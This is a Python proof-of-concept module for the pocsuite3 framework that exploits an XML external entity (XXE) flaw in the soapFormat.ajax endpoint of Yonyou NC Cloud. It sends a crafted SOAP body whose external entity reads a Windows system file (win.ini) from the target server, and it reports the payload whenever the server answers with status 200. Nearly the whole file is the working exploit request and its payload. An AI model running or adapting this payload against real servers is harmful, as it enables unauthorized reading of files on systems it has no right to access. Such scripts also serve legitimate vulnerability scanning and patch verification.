# _*_ coding:utf-8 _*_
# @Time : 2023/12/27 21:05
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str


class NcCloud(POCBase):
    pocDesc = '''用友NC Cloud soapFormat.ajax接口XXE漏洞'''
    vulID = '20231227'
    version = '1'
    author = '公众号网络安全透视镜'
    vulDate = '2023-12-27'
    createDate = '2023-12-27'
    updateDate = '2023-12-27'
    name = '用友NC Cloud soapFormat.ajax接口XXE漏洞'
    appName = '用友NC Cloud'

    def _verify(self):

        result = {}
        url = self.url + '/uapws/soapFormat.ajax'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Connection': 'close',
            'Host': '127.0.0.1',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        data = """<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///C://windows/win.ini"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a"""
        payload = """
                POST /uapws/soapFormat.ajax HTTP/1.1
                User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
                Accept-Encoding: gzip, deflate
                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
                Connection: close
                Host: 127.0.0.1
                Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
                Upgrade-Insecure-Requests: 1
                Content-Type: application/x-www-form-urlencoded
                Content-Length: 259
                
                msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///C://windows/win.ini"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a     """

        try:

            response = requests.post(url, headers=headers,data=data,verify=False)
            if response.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(NcCloud)